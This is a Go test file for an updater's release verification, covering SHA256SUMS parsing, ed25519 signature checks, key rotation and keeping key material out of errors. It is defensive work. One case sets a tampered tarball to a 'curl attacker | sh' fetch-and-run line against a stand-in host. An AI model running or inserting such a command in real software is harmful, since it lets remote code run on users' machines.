package updater

// What verify.go has to be true of, checked by handing it releases.
//
// Every key in this file is generated in process and never written down. That is
// not tidiness: a fixture key committed here would be a real release signing key
// in this repository, whatever the comment beside it said, and
// cmd/crswd's TestNoPrivateKeyInRepository sweeps the tree for exactly that.
// The daemon's own list is exercised too, but only for what can be checked
// without the half that signs — nothing outside the operator's terminal and the
// RELEASE_SIGNING_KEY secret has that.
//
// The three failures worth naming, because each leaves a green suite:
//
//   - **only the checksum is checked.** SHA256SUMS travels with the assets it
//     describes, so anyone who can serve a tampered tarball can serve a list
//     that covers it. TestSignatureMismatchRefuses builds exactly that release —
//     consistent list, correct checksum, signature over the list that was
//     actually signed — so a verifier that stopped after step 2 installs it.
//   - **a missing .sig read as "nothing to verify against."** An attacker who
//     serves a release can decline to serve a signature for it, so absence has
//     to be a refusal (FR-025). TestUnsignedReleaseRefuses.
//   - **only the first key line tried.** Rotation is additive and both keys are
//     live for as long as it takes every retained release to be re-signed, so a
//     loop that stops at line one strands half of them.
//     TestVerifyAcceptsAnyCommittedKey signs with each line in turn.
//
// Every table below carries a row for the release exactly as published, wanting
// no error. Without it a fixture broken for some unrelated reason makes every
// refusal case pass while proving nothing.

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"go/parser"
	"go/token"
	"os"
	"slices"
	"sort"
	"strings"
	"testing"
)

// verifySource is the file under test, read rather than called by the structural
// half of TestReleaseKeyFileIsEmbedded.
const verifySource = "verify.go"

// verifyMayImport is everything verify.go is allowed to reach.
//
// The list is the structural half of "the key is embedded, not fetched": with no
// net, no net/http and no os in scope, reading a key from the host that serves
// the release is not something this file can do — and that is the one
// "improvement" contracts/signing.md says spends the property signing exists to
// buy. Adding an entry here is a decision about the trust root of every update.
var verifyMayImport = []string{
	"crypto/ed25519",
	"crypto/sha256",
	"embed",
	"encoding/base64",
	"encoding/hex",
	"errors",
	"fmt",
	"strings",
}

// keyPair returns an ed25519 pair that exists only for the length of this test.
func keyPair(t *testing.T) (ed25519.PublicKey, ed25519.PrivateKey) {
	t.Helper()

	public, private, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("generate a key pair: %v", err)
	}
	return public, private
}

// publicHalf is the public key of a pair a case already holds the private half
// of, asserted rather than assumed because errcheck is configured to require it
// — and it is right to: an unchecked assertion here would yield the zero key,
// and "verification refused a release signed by the key it carries" is a failure
// that would read as a defect in verify.go.
func publicHalf(t *testing.T, signer ed25519.PrivateKey) ed25519.PublicKey {
	t.Helper()

	public, ok := signer.Public().(ed25519.PublicKey)
	if !ok {
		t.Fatalf("the public half of an ed25519 private key is not an ed25519.PublicKey")
	}
	return public
}

// keyList spells a release_key.txt: one base64 key per line, with the comment
// header and the blank lines the committed file actually carries, so the parser
// under test meets the shape it will meet in production rather than a tidied one.
func keyList(keys ...ed25519.PublicKey) string {
	var b strings.Builder
	b.WriteString("# The ed25519 public keys a release may be signed by.\n")
	b.WriteString("#\n")
	for _, key := range keys {
		b.WriteString("\n")
		b.WriteString(base64.StdEncoding.EncodeToString(key))
		b.WriteString("\n")
	}
	return b.String()
}

// sumsOver builds a SHA256SUMS the way the release workflow does: sha256sum(1)
// output over every asset, sorted by name.
//
// Sorted because the real one is, which puts the amd64 tarball fourth of five —
// so a parser that reads the first line, or the last, is caught here rather than
// by a release that 404s.
func sumsOver(assets map[string][]byte) []byte {
	names := make([]string, 0, len(assets))
	for name := range assets {
		names = append(names, name)
	}
	sort.Strings(names)

	var b strings.Builder
	for _, name := range names {
		digest := sha256.Sum256(assets[name])
		fmt.Fprintf(&b, "%s  %s\n", hex.EncodeToString(digest[:]), name)
	}
	return []byte(b.String())
}

// fixture is a release exactly as one is published. Every case below changes one
// thing about it and nothing else.
type fixture struct {
	name      string
	asset     []byte
	sums      []byte
	signature []byte
	keys      string
}

// published returns a correct release and the private half that signed it, so a
// case can re-sign what it tampered with.
func published(t *testing.T) (fixture, ed25519.PrivateKey) {
	t.Helper()

	name := AssetName(testVersion, "amd64")
	assets := map[string][]byte{
		name:                            []byte("the bytes of the amd64 tarball"),
		AssetName(testVersion, "arm64"): []byte("the bytes of the arm64 tarball"),
		UnitAsset:                       []byte(publishedUnit),
		"cloudflared.example.yml":       []byte("tunnel: crswd\n"),
		"crswd-api":                     []byte("#!/bin/sh\n"),
	}
	sums := sumsOver(assets)
	public, private := keyPair(t)

	return fixture{
		name:      name,
		asset:     assets[name],
		sums:      sums,
		signature: ed25519.Sign(private, sums),
		keys:      keyList(public),
	}, private
}

// verify runs the daemon's own verification against this release.
func (f fixture) verify() error {
	return verifyAgainst(f.name, f.asset, f.sums, f.signature, f.keys)
}

// resum replaces the checksum list and signs the replacement.
//
// A case about how a list is *written* has to leave the signature over the list
// it wrote, or it is a case about the signature: the refusal it got would be
// ErrSignatureUnverified whatever the parser did with the line, and the parser is
// what it means to be testing.
func (f *fixture) resum(signer ed25519.PrivateKey, sums []byte) {
	f.sums = sums
	f.signature = ed25519.Sign(signer, sums)
}

// run is the shared body of every table here: mutate a published release, verify
// it, and require the named sentinel — or none.
func run(t *testing.T, cases []verifyCase) {
	t.Helper()

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()

			release, private := published(t)
			if c.mutate != nil {
				c.mutate(t, &release, private)
			}

			err := release.verify()
			switch {
			case c.want == nil && err != nil:
				t.Fatalf("this release is exactly as one is published and verification refused it: %v", err)
			case c.want != nil && err == nil:
				t.Fatalf("verification accepted this release; it must refuse with %v", c.want)
			case c.want != nil && !errors.Is(err, c.want):
				t.Fatalf("verification refused with %v; want %v", err, c.want)
			}
		})
	}
}

type verifyCase struct {
	name   string
	mutate func(t *testing.T, f *fixture, signer ed25519.PrivateKey)
	want   error
}

// TestChecksumMismatchRefuses is step 2: the bytes are the published bytes, or
// the update does not happen (FR-023, FR-028).
//
// The last case is what pins the *order* the contract fixes. A release that is
// wrong in both ways at once is refused for the concrete, local reason rather
// than the cryptographic one, because that is the refusal an operator can act
// on.
func TestChecksumMismatchRefuses(t *testing.T) {
	t.Parallel()

	run(t, []verifyCase{
		{
			name: "the release exactly as published",
		},
		{
			name: "one byte of the tarball changed",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.asset = append([]byte(nil), f.asset...)
				f.asset[0] ^= 0x01
			},
			want: ErrChecksumMismatch,
		},
		{
			name: "the published bytes with something appended",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.asset = append(append([]byte(nil), f.asset...), " and more"...)
			},
			want: ErrChecksumMismatch,
		},
		{
			name: "nothing downloaded at all",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.asset = nil
			},
			want: ErrChecksumMismatch,
		},
		{
			name: "an asset the list does not cover",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.name = AssetName("v0.43", "amd64")
			},
			want: ErrUnsummedAsset,
		},
		{
			name: "an asset whose name is a prefix of one that is covered",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.name = strings.TrimSuffix(f.name, ".gz")
			},
			want: ErrUnsummedAsset,
		},
		{
			name: "a list this parser cannot read",
			mutate: func(_ *testing.T, f *fixture, signer ed25519.PrivateKey) {
				f.resum(signer, []byte("not a checksum list at all\n"))
			},
			want: ErrMalformedChecksums,
		},
		{
			name: "a list summed in binary mode",
			mutate: func(_ *testing.T, f *fixture, signer ed25519.PrivateKey) {
				// sha256sum -b, which coreutils spells " *" rather than "  ".
				// The release workflow does not use it; refusing a release over
				// which of the two forms it wrote would be a refusal nobody
				// could act on.
				f.resum(signer, []byte(strings.ReplaceAll(string(f.sums), "  ", " *")))
			},
		},
		{
			name: "a digest and a name separated by something else",
			mutate: func(_ *testing.T, f *fixture, signer ed25519.PrivateKey) {
				// Anything after the digest read as a separator means a line can
				// be taken to cover a name it does not.
				f.resum(signer, append([]byte(strings.Repeat("a", sha256.Size*2)+"\tcrswd-api\n"), f.sums...))
			},
			want: ErrMalformedChecksums,
		},
		{
			name: "a digest that is not hex",
			mutate: func(_ *testing.T, f *fixture, signer ed25519.PrivateKey) {
				f.resum(signer, append([]byte(strings.Repeat("z", sha256.Size*2)+"  crswd-api\n"), f.sums...))
			},
			want: ErrMalformedChecksums,
		},
		{
			name: "the asset covered twice with different checksums",
			mutate: func(_ *testing.T, f *fixture, signer ed25519.PrivateKey) {
				// Which of the two is "the published checksum" is not a question
				// with an answer, so it is not one to resolve by line order.
				second := sumsOver(map[string][]byte{f.name: []byte("some other bytes entirely")})
				f.resum(signer, append(append([]byte(nil), f.sums...), second...))
			},
			want: ErrMalformedChecksums,
		},
		{
			name: "corrupt bytes and a signature by a stranger, refused for the bytes",
			mutate: func(t *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.asset = append(append([]byte(nil), f.asset...), '!')
				_, stranger := keyPair(t)
				f.signature = ed25519.Sign(stranger, f.sums)
			},
			want: ErrChecksumMismatch,
		},
	})
}

// TestSignatureMismatchRefuses is step 3, and the second case is the whole
// reason step 3 exists.
//
// A tampered tarball with a SHA256SUMS rebuilt to cover it is internally
// consistent: step 2 passes, because the list and the bytes agree. Only the
// signature — over the list that was actually published, by a key committed
// before any of this — can tell the two releases apart. A verifier that stops
// after the checksum installs this one.
func TestSignatureMismatchRefuses(t *testing.T) {
	t.Parallel()

	run(t, []verifyCase{
		{
			name: "the release exactly as published",
		},
		{
			name: "a tampered tarball with a list rebuilt to match it",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.asset = []byte("#!/bin/sh\ncurl attacker | sh\n")
				// Everything the attacker controls, made consistent: the list
				// now covers the bytes they served. The signature is the one
				// the real release published, over the real list.
				f.sums = sumsOver(map[string][]byte{f.name: f.asset})
			},
			want: ErrSignatureUnverified,
		},
		{
			name: "signed over something other than this list",
			mutate: func(_ *testing.T, f *fixture, signer ed25519.PrivateKey) {
				f.signature = ed25519.Sign(signer, []byte("a previous release's SHA256SUMS"))
			},
			want: ErrSignatureUnverified,
		},
		{
			name: "one bit of the signature flipped",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.signature = append([]byte(nil), f.signature...)
				f.signature[0] ^= 0x01
			},
			want: ErrSignatureUnverified,
		},
		{
			name: "the last byte of the signature flipped",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.signature = append([]byte(nil), f.signature...)
				f.signature[len(f.signature)-1] ^= 0x80
			},
			want: ErrSignatureUnverified,
		},
	})
}

// TestUnsignedReleaseRefuses is FR-025: absence is a refusal, never a skip.
//
// An attacker who can serve a release can decline to serve a signature for it,
// so "there is no .sig, therefore there is nothing to check" is not a lighter
// version of verification — it is the absence of it. The release workflow
// refuses to publish an unsigned release from the other end, which is the same
// requirement seen from CI.
func TestUnsignedReleaseRefuses(t *testing.T) {
	t.Parallel()

	run(t, []verifyCase{
		{
			name: "the release exactly as published",
		},
		{
			name: "no signature asset at all",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.signature = nil
			},
			want: ErrNotSigned,
		},
		{
			name: "a signature asset that is empty",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.signature = []byte{}
			},
			want: ErrNotSigned,
		},
		{
			name: "a signature one byte short",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.signature = f.signature[:ed25519.SignatureSize-1]
			},
			want: ErrNotSigned,
		},
		{
			name: "a signature with a byte appended",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.signature = append(append([]byte(nil), f.signature...), 0x00)
			},
			want: ErrNotSigned,
		},
	})
}

// TestVerifyAcceptsAnyCommittedKey is rotation, which is additive: every line in
// release_key.txt may verify (contracts/signing.md).
//
// It signs with each of three lines in turn. A loop that stops at the first
// passes the first subtest and fails the other two, which is the mutation this
// exists for — and it is not a hypothetical: for the whole period between
// committing a new key and re-signing every retained release, releases signed by
// both are live, and the one an operator wants to roll back to is the older one.
func TestVerifyAcceptsAnyCommittedKey(t *testing.T) {
	t.Parallel()

	const lines = 3
	publics := make([]ed25519.PublicKey, lines)
	privates := make([]ed25519.PrivateKey, lines)
	for i := range publics {
		publics[i], privates[i] = keyPair(t)
	}
	carried := keyList(publics...)

	for i := range privates {
		t.Run(fmt.Sprintf("signed by line %d of %d", i+1, lines), func(t *testing.T) {
			t.Parallel()

			release, _ := published(t)
			release.keys = carried
			release.signature = ed25519.Sign(privates[i], release.sums)

			if err := release.verify(); err != nil {
				t.Fatalf("a release signed by a key %s carries was refused: %v", keyFileName, err)
			}
		})
	}
}

// TestVerifyRejectsUnknownKey is the other half of that: any well-formed
// signature must not pass.
//
// The commented-out case is how an operator retires a key — step 5 of the
// rotation — so a parser that ignored # would go on accepting releases signed by
// a key that was deliberately withdrawn. The 31-byte case is not only a refusal:
// ed25519.Verify *panics* on a key that is not 32 bytes, so without the length
// check a malformed committed line takes the daemon down rather than refusing an
// update.
func TestVerifyRejectsUnknownKey(t *testing.T) {
	t.Parallel()

	run(t, []verifyCase{
		{
			name: "the release exactly as published",
		},
		{
			name: "signed by a key this daemon does not carry",
			mutate: func(t *testing.T, f *fixture, _ ed25519.PrivateKey) {
				_, stranger := keyPair(t)
				f.signature = ed25519.Sign(stranger, f.sums)
			},
			want: ErrSignatureUnverified,
		},
		{
			name: "signed by a key that has been commented out",
			mutate: func(t *testing.T, f *fixture, _ ed25519.PrivateKey) {
				retired, private := keyPair(t)
				carried, _ := keyPair(t)
				f.keys = keyList(carried) + "# " + base64.StdEncoding.EncodeToString(retired) + "\n"
				f.signature = ed25519.Sign(private, f.sums)
			},
			want: ErrSignatureUnverified,
		},
		{
			name: "a key list holding only comments and blank lines",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.keys = keyList()
			},
			want: ErrNoReleaseKey,
		},
		{
			name: "a key list that is entirely empty",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.keys = ""
			},
			want: ErrNoReleaseKey,
		},
		{
			name: "a key line that is not base64",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.keys = "this is not a key\n"
			},
			want: ErrMalformedReleaseKey,
		},
		{
			name: "a key line that decodes to 31 bytes",
			mutate: func(_ *testing.T, f *fixture, _ ed25519.PrivateKey) {
				f.keys = base64.StdEncoding.EncodeToString(make([]byte, ed25519.PublicKeySize-1)) + "\n"
			},
			want: ErrMalformedReleaseKey,
		},
		{
			name: "one good key line and one typo, refused rather than partly trusted",
			mutate: func(t *testing.T, f *fixture, signer ed25519.PrivateKey) {
				f.keys = keyList(publicHalf(t, signer)) + "not-a-key\n"
			},
			want: ErrMalformedReleaseKey,
		},
	})
}

// TestReleaseKeyFileIsEmbedded is contracts/signing.md's last row: the verifier
// reads the committed file, and it reads it at build time.
//
// Three halves, because no one of them is enough. The first says the embedded
// bytes are the committed file's. The second says that file holds a key the
// parser under test accepts — a binary carrying none refuses every update, and
// the only place that can be caught is here, since it is decided by a build. The
// third denies this file the means to fetch one instead, which is the
// "improvement" the contract warns about by name: a key retrieved at update time
// from the host serving the release is the same factor twice.
func TestReleaseKeyFileIsEmbedded(t *testing.T) {
	t.Parallel()

	committed, err := os.ReadFile("release_key.txt")
	if err != nil {
		t.Fatalf("read the committed key file: %v", err)
	}
	if !bytes.Equal([]byte(releaseKeyFile), committed) {
		t.Errorf("what this binary embeds is not what %s holds. Whatever it is verifying against, it is not the file an operator edits to rotate a key", keyFileName)
	}

	keys, err := releaseKeys(releaseKeyFile)
	if err != nil {
		t.Fatalf("the embedded %s does not parse: %v.\nA daemon built from this tree refuses every update, and no test outside this one can see that", keyFileName, err)
	}
	if len(keys) == 0 {
		// Unreachable through releaseKeys, which returns ErrNoReleaseKey
		// instead. Asserted anyway: this is the property, and the error is one
		// implementation of it.
		t.Fatalf("%s carries no key, so nothing this daemon downloads can be shown to come from this project", keyFileName)
	}

	file, err := parser.ParseFile(token.NewFileSet(), verifySource, nil, parser.ImportsOnly)
	if err != nil {
		t.Fatalf("parse %s: %v", verifySource, err)
	}
	if len(file.Imports) == 0 {
		t.Fatalf("%s imports nothing at all, so this check is reading the wrong file", verifySource)
	}
	for _, imported := range file.Imports {
		path := strings.Trim(imported.Path.Value, `"`)
		if !slices.Contains(verifyMayImport, path) {
			t.Errorf("%s imports %s, which is not one of: %s.\nnet, net/http and os are the ones that matter — with none of them in scope, fetching the key it verifies against is not something this file can do",
				verifySource, path, strings.Join(verifyMayImport, ", "))
		}
	}
}

// TestNoKeyInAnyLogOrRecord is contracts/signing.md's prohibition applied to the
// one output verification has: its error values.
//
// Every refusal here goes to the journal, and an operator pastes a journal into
// an issue. A diagnostic that helpfully names the key it verified against — or
// the key it was handed — puts key material in all three places, and the public
// half is included in that rule because the failure mode is a *diagnostic*
// habit, not a distinction between halves. The line number is what an error may
// carry instead, and the tests above show that is enough to act on.
func TestNoKeyInAnyLogOrRecord(t *testing.T) {
	t.Parallel()

	// A private half is generated so that the check covers what would leak if a
	// refusal echoed the value it was given rather than only what it carries.
	stranger, strangerPrivate := keyPair(t)

	release, signer := published(t)
	carried := publicHalf(t, signer)

	// One refusal from every path that can produce one, plus the success, since
	// a verifier that logs what it accepted is the same defect.
	var refusals []error
	record := func(f fixture) {
		if err := f.verify(); err != nil {
			refusals = append(refusals, err)
		}
	}

	record(release) // accepted; contributes nothing, and must not.

	unsummed := release
	unsummed.name = AssetName("v0.43", "amd64")
	record(unsummed)

	corrupt := release
	corrupt.asset = append(append([]byte(nil), release.asset...), '!')
	record(corrupt)

	unsigned := release
	unsigned.signature = nil
	record(unsigned)

	short := release
	short.signature = release.signature[:1]
	record(short)

	byStranger := release
	byStranger.signature = ed25519.Sign(strangerPrivate, release.sums)
	record(byStranger)

	malformed := release
	malformed.keys = keyList(carried) + base64.StdEncoding.EncodeToString(make([]byte, 8)) + "\n"
	record(malformed)

	none := release
	none.keys = keyList()
	record(none)

	if len(refusals) != 7 {
		t.Fatalf("collected %d refusals, want 7: some path this test means to cover did not refuse, so its silence about key material proves nothing", len(refusals))
	}

	// Both alphabets and the raw bytes: the failure being guarded against is a
	// diagnostic printing whatever it holds, and it does not get to choose an
	// encoding this test would not recognise.
	secret := map[string]string{
		"the carried public key":        base64.StdEncoding.EncodeToString(carried),
		"the carried key, URL alphabet": base64.URLEncoding.EncodeToString(carried),
		"the carried key as raw bytes":  string(carried),
		"an unknown public key":         base64.StdEncoding.EncodeToString(stranger),
		"a private half":                base64.StdEncoding.EncodeToString(strangerPrivate),
		"a private half as raw bytes":   string(strangerPrivate),
	}
	for _, err := range refusals {
		for what, material := range secret {
			if strings.Contains(err.Error(), material) {
				// The message is not printed. It holds the key.
				t.Errorf("a refusal names %s. Errors reach the journal and the journal reaches issues; %s says the key appears in none of them", what, keyFileName)
			}
		}
	}

	// The committed key is the one a real refusal on a real host would have in
	// hand, so it is checked against the real thing rather than a generated
	// stand-in.
	for _, key := range mustParseCommittedKeys(t) {
		for _, err := range refusals {
			if strings.Contains(err.Error(), base64.StdEncoding.EncodeToString(key)) {
				t.Errorf("a refusal names a key committed to %s", keyFileName)
			}
		}
	}
}

// mustParseCommittedKeys is the daemon's own list, for the one assertion that
// has to be about the real file rather than a generated pair.
func mustParseCommittedKeys(t *testing.T) []ed25519.PublicKey {
	t.Helper()

	keys, err := releaseKeys(releaseKeyFile)
	if err != nil {
		t.Fatalf("parse the embedded %s: %v", keyFileName, err)
	}
	return keys
}
